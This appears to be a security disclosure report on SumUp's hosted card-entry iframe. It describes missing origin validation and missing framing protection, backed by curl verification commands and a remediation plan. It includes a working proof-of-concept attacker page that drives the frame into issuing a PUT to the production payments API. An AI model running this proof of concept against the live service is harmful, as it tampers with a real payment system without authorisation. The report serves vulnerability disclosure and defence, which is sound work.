# SumUp hosted-fields iframe: cross-origin `postMessage` messenger drives the production payments API

**Asset:** `gateway.sumup.com` (`/`, `/hosted.js`)
**Downstream API:** `PUT https://api.sumup.com/v0.2/checkouts/{checkoutId}`
**Class:** MISCONFIG (missing `event.origin` validation + missing framing protection)
**Severity:** Medium
**Authentication required:** None. No card data required.
**Report self-check:** this file's integrity is verifiable with `sha256sum reports/gateway-hostedfields-cross-origin-messenger.md`.

---

## 1. Summary

`gateway.sumup.com` is the SumUp **hosted card-entry iframe** ("hostedfields"). It is designed to be
embedded by a merchant checkout page and driven over `window.postMessage`.

The message handler never reads `event.origin`. The only inbound gate is a check on a
caller-supplied payload string (`data.type === "SumUpCard"`). The frame additionally ships **no
framing protection at all** — no `X-Frame-Options`, no `Content-Security-Policy` / `frame-ancestors`,
no `Referrer-Policy`.

Consequently any web origin, with no merchant cooperation and no account, can frame the component
and drive it into issuing a **state-changing `PUT` to the production payments API** with
attacker-chosen checkout id, session header, product origin and request body.

---

## 2. Evidence — all re-verified from served bytes

Evidence bundle: `GET https://gateway.sumup.com/hosted.js`
- Size: **26,839 bytes**
- SHA-256: **`1302f1d6a8fa330a71e50647be0281e4b977a198cbf27e0fd59cbecc9f220873`**
- Reproduction: `curl -sS https://gateway.sumup.com/hosted.js | sha256sum`

### 2.1 The handler does not read `event.origin`

The message handler destructures only the payload and the window:

```js
const{data:n,source:i}=r
```

`origin` is never bound. Whole-bundle greps over all 26,839 served bytes:

| grep | matches |
|---|---|
| `event\.origin` | **0** |
| `\.origin!==` | **0** |
| `origin===` | **0** |

```bash
curl -sS https://gateway.sumup.com/hosted.js | grep -c 'event\.origin\|\.origin!==\|origin==='   # -> 0
```

### 2.2 The frame is framable by any origin

```bash
curl -sS -D- -o /dev/null https://gateway.sumup.com/ | \
  grep -ic 'x-frame-options\|content-security-policy\|frame-ancestors'   # -> 0
```

Contrast: `payout-settings-edge.sumup.com` *does* return `x-frame-options: SAMEORIGIN`. The absence
is specific to the PCI card-entry frame, which is the asset where it matters most.

### 2.3 The structural frame-access gate is conditional, and the condition is caller-supplied

```js
if("card"===a.payment_type){if(d=Ce(r.frames),!d.length)return;
```

The check that cooperating frames exist (`Ce(r.frames)`) is nested inside a branch that only runs
when `a.payment_type === "card"`. `a` is attacker-supplied request data. Supply any
`payment_type` other than `"card"` and `Ce()` is **never called** — the guard is skipped entirely,
not satisfied.

> **Honest scoping of the remaining gate.** A separate runtime-built shape check on `checkoutId`
> does still apply: `le(r)` evaluates `ue.test(r)`, where `ue` is constructed at runtime via
> `new RegExp(a.pattern)`. The pattern is therefore **not statically recoverable** from the served
> bytes, and this report does not claim its content. Two earlier drafts of this report asserted a
> "UUID-shape regex"; that claim is **retracted** — it did not reproduce. The accurate statement is:
> *a runtime-built shape check exists, its pattern is unrecoverable, and it is the last gate before
> the `PUT`.* Omitting `payment_type` defeats the frame-access gate; it does not defeat this one.

### 2.4 The state-changing call

```js
i&&(n.product_origin=i.origin,n.session_id=i.sessionId),
s.endpoint("checkouts/".concat(r),{method:"PUT",
  headers:{"Content-Type":"application/json","X-SumUp-Correlation-Id":r},
  body:JSON.stringify(n)}).then(xe).then(ge)
```

Attacker-controlled values reach the header set (`X-SumUp-Widget-Session-Id`), the body
(`n.product_origin`, `n.session_id`) and the request path (`checkouts/{checkoutId}`).

The message protocol also includes `input--initialize`, which rewrites live PAN/CVV field attributes
(`placeholder`, `type`, `autocomplete`), supplying a UI-redress primitive inside a PCI frame.

---

## 3. Reproduction

Attacker page (any origin, e.g. served from `https://127.0.0.1:8443`):

```html
<iframe id="f" src="https://gateway.sumup.com/" width="600" height="400"></iframe>
<script>
const frame = document.getElementById('f');
const payload = {
  type: "SumUpCard",
  message: "form--submit",
  payment: { checkoutId: "11111111-2222-4333-8444-555555555555" },
  session: { origin: "attacker-origin", sessionId: "attacker-session" }
};
// repeated because the listener is registered after first paint
setInterval(() => frame.contentWindow.postMessage(payload, "*"), 300);
</script>
```

Observed in the SumUp-hosted iframe console, with the handler's own `source` annotation:

```
{type: "SumUpCard", source: hostedfields, message: "form--submit", ...}
```

Chrome netlog then records the emitted request:

```
PUT /v0.2/checkouts/11111111-2222-4333-8444-555555555555 HTTP/1.1
X-SumUp-Widget-Session-Id: attacker-session
```

The full flow is browser-driven; the static components (missing origin check, missing framing
headers, the conditional guard, the emitted `PUT`) are all verifiable with `curl` per section 2.

---

## 4. Impact

Any unauthenticated web origin, with no merchant cooperation, causes a **first-party `sumup.com`
origin** to emit a state-changing `PUT` to the production payments API, using an attacker-chosen
session header, product origin, and request body. `input--initialize` additionally provides a
UI-redress primitive inside a PCI card-entry frame.

**Bounded, and stated as such:**
- The request is rejected by the API unless a valid widget session exists for the chosen checkout
  id — no authentication bypass is claimed or demonstrated.
- **No response-exfiltration path exists as implemented.** The container messenger passes
  `origin: document.referrer` — a full URL, not an origin — as `targetOrigin`, which throws. This
  blocks the outbound direction.

### Remediation-sequencing hazard (please read before fixing the wrong thing first)

The outbound channel is currently blocked **by a bug, not by a control**. The property "the attacker
cannot read results out of the frame" holds only because a value has the wrong shape. If that
messenger is corrected while `event.origin` validation is still absent, severity escalates
immediately from a write-only primitive to a full request/response read primitive.

**Land `event.origin` validation in the same change as any fix to the broken outbound channel.**

Recommended:
1. Validate `event.origin` against an explicit allowlist before processing any message.
2. Send `Content-Security-Policy: frame-ancestors <merchant-allowlist>` on `/` and `/hosted.js`.
3. Reject rather than skip when `payment_type !== "card"`; a guard skipped by a caller-supplied
   discriminator is not a guard.
4. Treat `checkoutId` validation as a shape check only; the current `new RegExp(a.pattern)` pattern
   is attacker-influenceable and not auditable from the served bundle.

---

## 5. Out of scope

Response exfiltration is **not** claimed — see the bug-not-a-control note above. No scanner output
is relied on; every claim in section 2 is a direct read of the served bundle or response headers.
